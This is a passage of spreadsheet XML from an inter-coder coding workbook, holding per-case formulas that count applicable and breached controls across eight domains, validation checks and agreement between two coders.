      <c r="A223" s="11">
        <f>Cases!A223</f>
        <v/>
      </c>
      <c r="B223" s="11">
        <f>Cases!B223</f>
        <v/>
      </c>
      <c r="C223" s="11">
        <f>Cases!C223</f>
        <v/>
      </c>
      <c r="D223" s="11">
        <f>IF(Cases!F223="",LEFT(Cases!G223,120),Cases!F223)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E223:L223)=0,"",SUM(E223:L223))</f>
        <v/>
      </c>
      <c r="AJ223" s="13">
        <f>IF(AI223="","",N(E223)*3+N(F223)*2+N(G223)*2+N(H223)*2+N(I223)*2+N(J223)*3+N(K223)*3+N(L223)*3)</f>
        <v/>
      </c>
      <c r="AK223" s="13">
        <f>IF(AI223="","",COUNTIF(N223:AG223,1))</f>
        <v/>
      </c>
      <c r="AL223" s="13">
        <f>IF(OR(AJ223="",AJ223=0),"",ROUND(100*(AJ223-AK223)/AJ223,1))</f>
        <v/>
      </c>
      <c r="AM223" s="11">
        <f>IF(AI223="","",IF(AI223=0,"No domain coded 1; ","")&amp;IF(M223="","Primary domain missing; ",IF(IFERROR(INDEX(E223:L223,1,M223),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N223:AG223)&lt;&gt;AJ223,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH223="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN223" s="13">
        <f>IF(AND(AI223&lt;&gt;"",AM223=""),1,0)</f>
        <v/>
      </c>
      <c r="AO223" s="14" t="n"/>
    </row>
    <row r="224">
      <c r="A224" s="11">
        <f>Cases!A224</f>
        <v/>
      </c>
      <c r="B224" s="11">
        <f>Cases!B224</f>
        <v/>
      </c>
      <c r="C224" s="11">
        <f>Cases!C224</f>
        <v/>
      </c>
      <c r="D224" s="11">
        <f>IF(Cases!F224="",LEFT(Cases!G224,120),Cases!F224)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E224:L224)=0,"",SUM(E224:L224))</f>
        <v/>
      </c>
      <c r="AJ224" s="13">
        <f>IF(AI224="","",N(E224)*3+N(F224)*2+N(G224)*2+N(H224)*2+N(I224)*2+N(J224)*3+N(K224)*3+N(L224)*3)</f>
        <v/>
      </c>
      <c r="AK224" s="13">
        <f>IF(AI224="","",COUNTIF(N224:AG224,1))</f>
        <v/>
      </c>
      <c r="AL224" s="13">
        <f>IF(OR(AJ224="",AJ224=0),"",ROUND(100*(AJ224-AK224)/AJ224,1))</f>
        <v/>
      </c>
      <c r="AM224" s="11">
        <f>IF(AI224="","",IF(AI224=0,"No domain coded 1; ","")&amp;IF(M224="","Primary domain missing; ",IF(IFERROR(INDEX(E224:L224,1,M224),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N224:AG224)&lt;&gt;AJ224,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH224="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN224" s="13">
        <f>IF(AND(AI224&lt;&gt;"",AM224=""),1,0)</f>
        <v/>
      </c>
      <c r="AO224" s="14" t="n"/>
    </row>
  </sheetData>
  <conditionalFormatting sqref="N2:N224">
    <cfRule type="expression" priority="1" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="O2:O224">
    <cfRule type="expression" priority="2" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="P2:P224">
    <cfRule type="expression" priority="3" dxfId="0" stopIfTrue="1">
      <formula>$E2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Q2:Q224">
    <cfRule type="expression" priority="4" dxfId="0" stopIfTrue="1">
      <formula>$F2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="R2:R224">
    <cfRule type="expression" priority="5" dxfId="0" stopIfTrue="1">
      <formula>$F2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="S2:S224">
    <cfRule type="expression" priority="6" dxfId="0" stopIfTrue="1">
      <formula>$G2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="T2:T224">
    <cfRule type="expression" priority="7" dxfId="0" stopIfTrue="1">
      <formula>$G2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="U2:U224">
    <cfRule type="expression" priority="8" dxfId="0" stopIfTrue="1">
      <formula>$H2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="V2:V224">
    <cfRule type="expression" priority="9" dxfId="0" stopIfTrue="1">
      <formula>$H2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="W2:W224">
    <cfRule type="expression" priority="10" dxfId="0" stopIfTrue="1">
      <formula>$I2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="X2:X224">
    <cfRule type="expression" priority="11" dxfId="0" stopIfTrue="1">
      <formula>$I2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Y2:Y224">
    <cfRule type="expression" priority="12" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="Z2:Z224">
    <cfRule type="expression" priority="13" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AA2:AA224">
    <cfRule type="expression" priority="14" dxfId="0" stopIfTrue="1">
      <formula>$J2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AB2:AB224">
    <cfRule type="expression" priority="15" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AC2:AC224">
    <cfRule type="expression" priority="16" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AD2:AD224">
    <cfRule type="expression" priority="17" dxfId="0" stopIfTrue="1">
      <formula>$K2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AE2:AE224">
    <cfRule type="expression" priority="18" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AF2:AF224">
    <cfRule type="expression" priority="19" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AG2:AG224">
    <cfRule type="expression" priority="20" dxfId="0" stopIfTrue="1">
      <formula>$L2=0</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="AM2:AM224">
    <cfRule type="expression" priority="21" dxfId="1">
      <formula>LEN(AM2)&gt;0</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="3">
    <dataValidation sqref="E2:L224 AH2:AH224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,0"</formula1>
    </dataValidation>
    <dataValidation sqref="N2:AG224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,0,NA"</formula1>
    </dataValidation>
    <dataValidation sqref="M2:M224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,2,3,4,5,6,7,8"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O22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4" customWidth="1" min="3" max="3"/>
    <col width="42"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24" customWidth="1" min="39" max="39"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>case_id</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>batch</t>
        </is>
      </c>
      <c r="C1" s="4" t="inlineStr">
        <is>
          <t>product</t>
        </is>
      </c>
      <c r="D1" s="4" t="inlineStr">
        <is>
          <t>title</t>
        </is>
      </c>
      <c r="E1" s="4" t="inlineStr">
        <is>
          <t>d1</t>
        </is>
      </c>
      <c r="F1" s="4" t="inlineStr">
        <is>
          <t>d2</t>
        </is>
      </c>
      <c r="G1" s="4" t="inlineStr">
        <is>
          <t>d3</t>
        </is>
      </c>
      <c r="H1" s="4" t="inlineStr">
        <is>
          <t>d4</t>
        </is>
      </c>
      <c r="I1" s="4" t="inlineStr">
        <is>
          <t>d5</t>
        </is>
      </c>
      <c r="J1" s="4" t="inlineStr">
        <is>
          <t>d6</t>
        </is>
      </c>
      <c r="K1" s="4" t="inlineStr">
        <is>
          <t>d7</t>
        </is>
      </c>
      <c r="L1" s="4" t="inlineStr">
        <is>
          <t>d8</t>
        </is>
      </c>
      <c r="M1" s="4" t="inlineStr">
        <is>
          <t>primary_domain</t>
        </is>
      </c>
      <c r="N1" s="4" t="inlineStr">
        <is>
          <t>c01</t>
        </is>
      </c>
      <c r="O1" s="4" t="inlineStr">
        <is>
          <t>c02</t>
        </is>
      </c>
      <c r="P1" s="4" t="inlineStr">
        <is>
          <t>c03</t>
        </is>
      </c>
      <c r="Q1" s="4" t="inlineStr">
        <is>
          <t>c04</t>
        </is>
      </c>
      <c r="R1" s="4" t="inlineStr">
        <is>
          <t>c05</t>
        </is>
      </c>
      <c r="S1" s="4" t="inlineStr">
        <is>
          <t>c06</t>
        </is>
      </c>
      <c r="T1" s="4" t="inlineStr">
        <is>
          <t>c07</t>
        </is>
      </c>
      <c r="U1" s="4" t="inlineStr">
        <is>
          <t>c08</t>
        </is>
      </c>
      <c r="V1" s="4" t="inlineStr">
        <is>
          <t>c09</t>
        </is>
      </c>
      <c r="W1" s="4" t="inlineStr">
        <is>
          <t>c10</t>
        </is>
      </c>
      <c r="X1" s="4" t="inlineStr">
        <is>
          <t>c11</t>
        </is>
      </c>
      <c r="Y1" s="4" t="inlineStr">
        <is>
          <t>c12</t>
        </is>
      </c>
      <c r="Z1" s="4" t="inlineStr">
        <is>
          <t>c13</t>
        </is>
      </c>
      <c r="AA1" s="4" t="inlineStr">
        <is>
          <t>c14</t>
        </is>
      </c>
      <c r="AB1" s="4" t="inlineStr">
        <is>
          <t>c15</t>
        </is>
      </c>
      <c r="AC1" s="4" t="inlineStr">
        <is>
          <t>c16</t>
        </is>
      </c>
      <c r="AD1" s="4" t="inlineStr">
        <is>
          <t>c17</t>
        </is>
      </c>
      <c r="AE1" s="4" t="inlineStr">
        <is>
          <t>c18</t>
        </is>
      </c>
      <c r="AF1" s="4" t="inlineStr">
        <is>
          <t>c19</t>
        </is>
      </c>
      <c r="AG1" s="4" t="inlineStr">
        <is>
          <t>c20</t>
        </is>
      </c>
      <c r="AH1" s="4" t="inlineStr">
        <is>
          <t>covered</t>
        </is>
      </c>
      <c r="AI1" s="4" t="inlineStr">
        <is>
          <t>n_domains</t>
        </is>
      </c>
      <c r="AJ1" s="4" t="inlineStr">
        <is>
          <t>n_applicable</t>
        </is>
      </c>
      <c r="AK1" s="4" t="inlineStr">
        <is>
          <t>n_breached</t>
        </is>
      </c>
      <c r="AL1" s="4" t="inlineStr">
        <is>
          <t>gcs</t>
        </is>
      </c>
      <c r="AM1" s="4" t="inlineStr">
        <is>
          <t>check</t>
        </is>
      </c>
      <c r="AN1" s="4" t="inlineStr">
        <is>
          <t>agree_all</t>
        </is>
      </c>
      <c r="AO1" s="4" t="inlineStr">
        <is>
          <t>notes</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="11">
        <f>Coder1!A2</f>
        <v/>
      </c>
      <c r="B2" s="11">
        <f>Coder1!B2</f>
        <v/>
      </c>
      <c r="C2" s="11">
        <f>Coder1!C2</f>
        <v/>
      </c>
      <c r="D2" s="11">
        <f>Coder1!D2</f>
        <v/>
      </c>
      <c r="E2" s="14">
        <f>IF(AND(Coder1!E2&amp;""&lt;&gt;"",Coder1!E2&amp;""=Coder2!E2&amp;""),Coder1!E2,"")</f>
        <v/>
      </c>
      <c r="F2" s="14">
        <f>IF(AND(Coder1!F2&amp;""&lt;&gt;"",Coder1!F2&amp;""=Coder2!F2&amp;""),Coder1!F2,"")</f>
        <v/>
      </c>
      <c r="G2" s="14">
        <f>IF(AND(Coder1!G2&amp;""&lt;&gt;"",Coder1!G2&amp;""=Coder2!G2&amp;""),Coder1!G2,"")</f>
        <v/>
      </c>
      <c r="H2" s="14">
        <f>IF(AND(Coder1!H2&amp;""&lt;&gt;"",Coder1!H2&amp;""=Coder2!H2&amp;""),Coder1!H2,"")</f>
        <v/>
      </c>
      <c r="I2" s="14">
        <f>IF(AND(Coder1!I2&amp;""&lt;&gt;"",Coder1!I2&amp;""=Coder2!I2&amp;""),Coder1!I2,"")</f>
        <v/>
      </c>
      <c r="J2" s="14">
        <f>IF(AND(Coder1!J2&amp;""&lt;&gt;"",Coder1!J2&amp;""=Coder2!J2&amp;""),Coder1!J2,"")</f>
        <v/>
      </c>
      <c r="K2" s="14">
        <f>IF(AND(Coder1!K2&amp;""&lt;&gt;"",Coder1!K2&amp;""=Coder2!K2&amp;""),Coder1!K2,"")</f>
        <v/>
      </c>
      <c r="L2" s="14">
        <f>IF(AND(Coder1!L2&amp;""&lt;&gt;"",Coder1!L2&amp;""=Coder2!L2&amp;""),Coder1!L2,"")</f>
        <v/>
      </c>
      <c r="M2" s="14">
        <f>IF(AND(Coder1!M2&amp;""&lt;&gt;"",Coder1!M2&amp;""=Coder2!M2&amp;""),Coder1!M2,"")</f>
        <v/>
      </c>
      <c r="N2" s="14">
        <f>IF(AND(Coder1!N2&amp;""&lt;&gt;"",Coder1!N2&amp;""=Coder2!N2&amp;""),Coder1!N2,"")</f>
        <v/>
      </c>
      <c r="O2" s="14">
        <f>IF(AND(Coder1!O2&amp;""&lt;&gt;"",Coder1!O2&amp;""=Coder2!O2&amp;""),Coder1!O2,"")</f>
        <v/>
      </c>
      <c r="P2" s="14">
        <f>IF(AND(Coder1!P2&amp;""&lt;&gt;"",Coder1!P2&amp;""=Coder2!P2&amp;""),Coder1!P2,"")</f>
        <v/>
      </c>
      <c r="Q2" s="14">
        <f>IF(AND(Coder1!Q2&amp;""&lt;&gt;"",Coder1!Q2&amp;""=Coder2!Q2&amp;""),Coder1!Q2,"")</f>
        <v/>
      </c>
      <c r="R2" s="14">
        <f>IF(AND(Coder1!R2&amp;""&lt;&gt;"",Coder1!R2&amp;""=Coder2!R2&amp;""),Coder1!R2,"")</f>
        <v/>
      </c>
      <c r="S2" s="14">
        <f>IF(AND(Coder1!S2&amp;""&lt;&gt;"",Coder1!S2&amp;""=Coder2!S2&amp;""),Coder1!S2,"")</f>
        <v/>
      </c>
      <c r="T2" s="14">
        <f>IF(AND(Coder1!T2&amp;""&lt;&gt;"",Coder1!T2&amp;""=Coder2!T2&amp;""),Coder1!T2,"")</f>
        <v/>
      </c>
      <c r="U2" s="14">
        <f>IF(AND(Coder1!U2&amp;""&lt;&gt;"",Coder1!U2&amp;""=Coder2!U2&amp;""),Coder1!U2,"")</f>
        <v/>
      </c>
      <c r="V2" s="14">
        <f>IF(AND(Coder1!V2&amp;""&lt;&gt;"",Coder1!V2&amp;""=Coder2!V2&amp;""),Coder1!V2,"")</f>
        <v/>
      </c>
      <c r="W2" s="14">
        <f>IF(AND(Coder1!W2&amp;""&lt;&gt;"",Coder1!W2&amp;""=Coder2!W2&amp;""),Coder1!W2,"")</f>
        <v/>
      </c>
      <c r="X2" s="14">
        <f>IF(AND(Coder1!X2&amp;""&lt;&gt;"",Coder1!X2&amp;""=Coder2!X2&amp;""),Coder1!X2,"")</f>
        <v/>
      </c>
      <c r="Y2" s="14">
        <f>IF(AND(Coder1!Y2&amp;""&lt;&gt;"",Coder1!Y2&amp;""=Coder2!Y2&amp;""),Coder1!Y2,"")</f>
        <v/>
      </c>
      <c r="Z2" s="14">
        <f>IF(AND(Coder1!Z2&amp;""&lt;&gt;"",Coder1!Z2&amp;""=Coder2!Z2&amp;""),Coder1!Z2,"")</f>
        <v/>
      </c>
      <c r="AA2" s="14">
        <f>IF(AND(Coder1!AA2&amp;""&lt;&gt;"",Coder1!AA2&amp;""=Coder2!AA2&amp;""),Coder1!AA2,"")</f>
        <v/>
      </c>
      <c r="AB2" s="14">
        <f>IF(AND(Coder1!AB2&amp;""&lt;&gt;"",Coder1!AB2&amp;""=Coder2!AB2&amp;""),Coder1!AB2,"")</f>
        <v/>
      </c>
      <c r="AC2" s="14">
        <f>IF(AND(Coder1!AC2&amp;""&lt;&gt;"",Coder1!AC2&amp;""=Coder2!AC2&amp;""),Coder1!AC2,"")</f>
        <v/>
      </c>
      <c r="AD2" s="14">
        <f>IF(AND(Coder1!AD2&amp;""&lt;&gt;"",Coder1!AD2&amp;""=Coder2!AD2&amp;""),Coder1!AD2,"")</f>
        <v/>
      </c>
      <c r="AE2" s="14">
        <f>IF(AND(Coder1!AE2&amp;""&lt;&gt;"",Coder1!AE2&amp;""=Coder2!AE2&amp;""),Coder1!AE2,"")</f>
        <v/>
      </c>
      <c r="AF2" s="14">
        <f>IF(AND(Coder1!AF2&amp;""&lt;&gt;"",Coder1!AF2&amp;""=Coder2!AF2&amp;""),Coder1!AF2,"")</f>
        <v/>
      </c>
      <c r="AG2" s="14">
        <f>IF(AND(Coder1!AG2&amp;""&lt;&gt;"",Coder1!AG2&amp;""=Coder2!AG2&amp;""),Coder1!AG2,"")</f>
        <v/>
      </c>
      <c r="AH2" s="14">
        <f>IF(AND(Coder1!AH2&amp;""&lt;&gt;"",Coder1!AH2&amp;""=Coder2!AH2&amp;""),Coder1!AH2,"")</f>
        <v/>
      </c>
      <c r="AI2" s="11">
        <f>IF(COUNT(E2:L2)=0,"",SUM(E2:L2))</f>
        <v/>
      </c>
      <c r="AJ2" s="11">
        <f>IF(AI2="","",N(E2)*3+N(F2)*2+N(G2)*2+N(H2)*2+N(I2)*2+N(J2)*3+N(K2)*3+N(L2)*3)</f>
        <v/>
      </c>
      <c r="AK2" s="11">
        <f>IF(AI2="","",COUNTIF(N2:AG2,1))</f>
        <v/>
      </c>
      <c r="AL2" s="11">
        <f>IF(OR(AJ2="",AJ2=0),"",ROUND(100*(AJ2-AK2)/AJ2,1))</f>
        <v/>
      </c>
      <c r="AM2" s="11">
        <f>IF(AND(Coder1!AN2=1,Coder2!AN2=1),IF(COUNTBLANK(E2:AH2)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN2" s="11">
        <f>IF(AND(Coder1!AN2=1,Coder2!AN2=1),IF(SUMPRODUCT(--(Coder1!E2:AH2&amp;""&lt;&gt;Coder2!E2:AH2&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO2" s="11" t="n"/>
    </row>
    <row r="3">
      <c r="A3" s="11">
        <f>Coder1!A3</f>
        <v/>
      </c>
      <c r="B3" s="11">
        <f>Coder1!B3</f>
        <v/>
      </c>
      <c r="C3" s="11">
        <f>Coder1!C3</f>
        <v/>
      </c>
      <c r="D3" s="11">
        <f>Coder1!D3</f>
        <v/>
      </c>
      <c r="E3" s="14">
        <f>IF(AND(Coder1!E3&amp;""&lt;&gt;"",Coder1!E3&amp;""=Coder2!E3&amp;""),Coder1!E3,"")</f>
        <v/>
      </c>
      <c r="F3" s="14">
        <f>IF(AND(Coder1!F3&amp;""&lt;&gt;"",Coder1!F3&amp;""=Coder2!F3&amp;""),Coder1!F3,"")</f>
        <v/>
      </c>
      <c r="G3" s="14">
        <f>IF(AND(Coder1!G3&amp;""&lt;&gt;"",Coder1!G3&amp;""=Coder2!G3&amp;""),Coder1!G3,"")</f>
        <v/>
      </c>
      <c r="H3" s="14">
        <f>IF(AND(Coder1!H3&amp;""&lt;&gt;"",Coder1!H3&amp;""=Coder2!H3&amp;""),Coder1!H3,"")</f>
        <v/>
      </c>
      <c r="I3" s="14">
        <f>IF(AND(Coder1!I3&amp;""&lt;&gt;"",Coder1!I3&amp;""=Coder2!I3&amp;""),Coder1!I3,"")</f>
        <v/>
      </c>
      <c r="J3" s="14">
        <f>IF(AND(Coder1!J3&amp;""&lt;&gt;"",Coder1!J3&amp;""=Coder2!J3&amp;""),Coder1!J3,"")</f>
        <v/>
      </c>
      <c r="K3" s="14">
        <f>IF(AND(Coder1!K3&amp;""&lt;&gt;"",Coder1!K3&amp;""=Coder2!K3&amp;""),Coder1!K3,"")</f>
        <v/>
      </c>
      <c r="L3" s="14">
        <f>IF(AND(Coder1!L3&amp;""&lt;&gt;"",Coder1!L3&amp;""=Coder2!L3&amp;""),Coder1!L3,"")</f>
        <v/>
      </c>
      <c r="M3" s="14">
        <f>IF(AND(Coder1!M3&amp;""&lt;&gt;"",Coder1!M3&amp;""=Coder2!M3&amp;""),Coder1!M3,"")</f>
        <v/>
      </c>
      <c r="N3" s="14">
        <f>IF(AND(Coder1!N3&amp;""&lt;&gt;"",Coder1!N3&amp;""=Coder2!N3&amp;""),Coder1!N3,"")</f>
        <v/>
      </c>
      <c r="O3" s="14">
        <f>IF(AND(Coder1!O3&amp;""&lt;&gt;"",Coder1!O3&amp;""=Coder2!O3&amp;""),Coder1!O3,"")</f>
        <v/>
      </c>
      <c r="P3" s="14">
        <f>IF(AND(Coder1!P3&amp;""&lt;&gt;"",Coder1!P3&amp;""=Coder2!P3&amp;""),Coder1!P3,"")</f>
        <v/>
      </c>
      <c r="Q3" s="14">
        <f>IF(AND(Coder1!Q3&amp;""&lt;&gt;"",Coder1!Q3&amp;""=Coder2!Q3&amp;""),Coder1!Q3,"")</f>
        <v/>
      </c>
      <c r="R3" s="14">
        <f>IF(AND(Coder1!R3&amp;""&lt;&gt;"",Coder1!R3&amp;""=Coder2!R3&amp;""),Coder1!R3,"")</f>
        <v/>
      </c>
      <c r="S3" s="14">
        <f>IF(AND(Coder1!S3&amp;""&lt;&gt;"",Coder1!S3&amp;""=Coder2!S3&amp;""),Coder1!S3,"")</f>
        <v/>
      </c>
      <c r="T3" s="14">
        <f>IF(AND(Coder1!T3&amp;""&lt;&gt;"",Coder1!T3&amp;""=Coder2!T3&amp;""),Coder1!T3,"")</f>
        <v/>
      </c>
      <c r="U3" s="14">
        <f>IF(AND(Coder1!U3&amp;""&lt;&gt;"",Coder1!U3&amp;""=Coder2!U3&amp;""),Coder1!U3,"")</f>
        <v/>
      </c>
      <c r="V3" s="14">
        <f>IF(AND(Coder1!V3&amp;""&lt;&gt;"",Coder1!V3&amp;""=Coder2!V3&amp;""),Coder1!V3,"")</f>
        <v/>
      </c>
      <c r="W3" s="14">
        <f>IF(AND(Coder1!W3&amp;""&lt;&gt;"",Coder1!W3&amp;""=Coder2!W3&amp;""),Coder1!W3,"")</f>
        <v/>
      </c>
      <c r="X3" s="14">
        <f>IF(AND(Coder1!X3&amp;""&lt;&gt;"",Coder1!X3&amp;""=Coder2!X3&amp;""),Coder1!X3,"")</f>
        <v/>
      </c>
      <c r="Y3" s="14">
        <f>IF(AND(Coder1!Y3&amp;""&lt;&gt;"",Coder1!Y3&amp;""=Coder2!Y3&amp;""),Coder1!Y3,"")</f>
        <v/>
      </c>
      <c r="Z3" s="14">
        <f>IF(AND(Coder1!Z3&amp;""&lt;&gt;"",Coder1!Z3&amp;""=Coder2!Z3&amp;""),Coder1!Z3,"")</f>
        <v/>
      </c>
      <c r="AA3" s="14">
        <f>IF(AND(Coder1!AA3&amp;""&lt;&gt;"",Coder1!AA3&amp;""=Coder2!AA3&amp;""),Coder1!AA3,"")</f>
        <v/>
      </c>
      <c r="AB3" s="14">
        <f>IF(AND(Coder1!AB3&amp;""&lt;&gt;"",Coder1!AB3&amp;""=Coder2!AB3&amp;""),Coder1!AB3,"")</f>
        <v/>
      </c>
      <c r="AC3" s="14">
        <f>IF(AND(Coder1!AC3&amp;""&lt;&gt;"",Coder1!AC3&amp;""=Coder2!AC3&amp;""),Coder1!AC3,"")</f>
        <v/>
      </c>
      <c r="AD3" s="14">
        <f>IF(AND(Coder1!AD3&amp;""&lt;&gt;"",Coder1!AD3&amp;""=Coder2!AD3&amp;""),Coder1!AD3,"")</f>
        <v/>
      </c>
      <c r="AE3" s="14">
        <f>IF(AND(Coder1!AE3&amp;""&lt;&gt;"",Coder1!AE3&amp;""=Coder2!AE3&amp;""),Coder1!AE3,"")</f>
        <v/>
      </c>
      <c r="AF3" s="14">
        <f>IF(AND(Coder1!AF3&amp;""&lt;&gt;"",Coder1!AF3&amp;""=Coder2!AF3&amp;""),Coder1!AF3,"")</f>
        <v/>
      </c>
      <c r="AG3" s="14">
        <f>IF(AND(Coder1!AG3&amp;""&lt;&gt;"",Coder1!AG3&amp;""=Coder2!AG3&amp;""),Coder1!AG3,"")</f>
        <v/>
      </c>
      <c r="AH3" s="14">
        <f>IF(AND(Coder1!AH3&amp;""&lt;&gt;"",Coder1!AH3&amp;""=Coder2!AH3&amp;""),Coder1!AH3,"")</f>
        <v/>
      </c>
      <c r="AI3" s="11">
        <f>IF(COUNT(E3:L3)=0,"",SUM(E3:L3))</f>
        <v/>
      </c>
      <c r="AJ3" s="11">
        <f>IF(AI3="","",N(E3)*3+N(F3)*2+N(G3)*2+N(H3)*2+N(I3)*2+N(J3)*3+N(K3)*3+N(L3)*3)</f>
        <v/>
      </c>
      <c r="AK3" s="11">
        <f>IF(AI3="","",COUNTIF(N3:AG3,1))</f>
        <v/>
      </c>
      <c r="AL3" s="11">
        <f>IF(OR(AJ3="",AJ3=0),"",ROUND(100*(AJ3-AK3)/AJ3,1))</f>
        <v/>
      </c>
      <c r="AM3" s="11">
        <f>IF(AND(Coder1!AN3=1,Coder2!AN3=1),IF(COUNTBLANK(E3:AH3)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN3" s="11">
        <f>IF(AND(Coder1!AN3=1,Coder2!AN3=1),IF(SUMPRODUCT(--(Coder1!E3:AH3&amp;""&lt;&gt;Coder2!E3:AH3&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO3" s="11" t="n"/>
    </row>
    <row r="4">
      <c r="A4" s="11">
        <f>Coder1!A4</f>
        <v/>
      </c>
      <c r="B4" s="11">
        <f>Coder1!B4</f>
        <v/>
      </c>
      <c r="C4" s="11">
        <f>Coder1!C4</f>
        <v/>
      </c>
      <c r="D4" s="11">
        <f>Coder1!D4</f>
        <v/>
      </c>
      <c r="E4" s="14">
        <f>IF(AND(Coder1!E4&amp;""&lt;&gt;"",Coder1!E4&amp;""=Coder2!E4&amp;""),Coder1!E4,"")</f>
        <v/>
      </c>
      <c r="F4" s="14">
        <f>IF(AND(Coder1!F4&amp;""&lt;&gt;"",Coder1!F4&amp;""=Coder2!F4&amp;""),Coder1!F4,"")</f>
        <v/>
      </c>
      <c r="G4" s="14">
        <f>IF(AND(Coder1!G4&amp;""&lt;&gt;"",Coder1!G4&amp;""=Coder2!G4&amp;""),Coder1!G4,"")</f>
        <v/>
      </c>
      <c r="H4" s="14">
        <f>IF(AND(Coder1!H4&amp;""&lt;&gt;"",Coder1!H4&amp;""=Coder2!H4&amp;""),Coder1!H4,"")</f>
        <v/>
      </c>
      <c r="I4" s="14">
        <f>IF(AND(Coder1!I4&amp;""&lt;&gt;"",Coder1!I4&amp;""=Coder2!I4&amp;""),Coder1!I4,"")</f>
        <v/>
      </c>
      <c r="J4" s="14">
        <f>IF(AND(Coder1!J4&amp;""&lt;&gt;"",Coder1!J4&amp;""=Coder2!J4&amp;""),Coder1!J4,"")</f>
        <v/>
      </c>
      <c r="K4" s="14">
        <f>IF(AND(Coder1!K4&amp;""&lt;&gt;"",Coder1!K4&amp;""=Coder2!K4&amp;""),Coder1!K4,"")</f>
        <v/>
      </c>
      <c r="L4" s="14">
        <f>IF(AND(Coder1!L4&amp;""&lt;&gt;"",Coder1!L4&amp;""=Coder2!L4&amp;""),Coder1!L4,"")</f>
        <v/>
      </c>
      <c r="M4" s="14">
        <f>IF(AND(Coder1!M4&amp;""&lt;&gt;"",Coder1!M4&amp;""=Coder2!M4&amp;""),Coder1!M4,"")</f>
        <v/>
      </c>
      <c r="N4" s="14">
        <f>IF(AND(Coder1!N4&amp;""&lt;&gt;"",Coder1!N4&amp;""=Coder2!N4&amp;""),Coder1!N4,"")</f>
        <v/>
      </c>
      <c r="O4" s="14">
        <f>IF(AND(Coder1!O4&amp;""&lt;&gt;"",Coder1!O4&amp;""=Coder2!O4&amp;""),Coder1!O4,"")</f>
        <v/>
      </c>
      <c r="P4" s="14">
        <f>IF(AND(Coder1!P4&amp;""&lt;&gt;"",Coder1!P4&amp;""=Coder2!P4&amp;""),Coder1!P4,"")</f>
        <v/>
      </c>
      <c r="Q4" s="14">
        <f>IF(AND(Coder1!Q4&amp;""&lt;&gt;"",Coder1!Q4&amp;""=Coder2!Q4&amp;""),Coder1!Q4,"")</f>
        <v/>
      </c>
      <c r="R4" s="14">
        <f>IF(AND(Coder1!R4&amp;""&lt;&gt;"",Coder1!R4&amp;""=Coder2!R4&amp;""),Coder1!R4,"")</f>
        <v/>
      </c>
      <c r="S4" s="14">
        <f>IF(AND(Coder1!S4&amp;""&lt;&gt;"",Coder1!S4&amp;""=Coder2!S4&amp;""),Coder1!S4,"")</f>
        <v/>
      </c>
      <c r="T4" s="14">
        <f>IF(AND(Coder1!T4&amp;""&lt;&gt;"",Coder1!T4&amp;""=Coder2!T4&amp;""),Coder1!T4,"")</f>
        <v/>
      </c>
      <c r="U4" s="14">
        <f>IF(AND(Coder1!U4&amp;""&lt;&gt;"",Coder1!U4&amp;""=Coder2!U4&amp;""),Coder1!U4,"")</f>
        <v/>
      </c>
      <c r="V4" s="14">
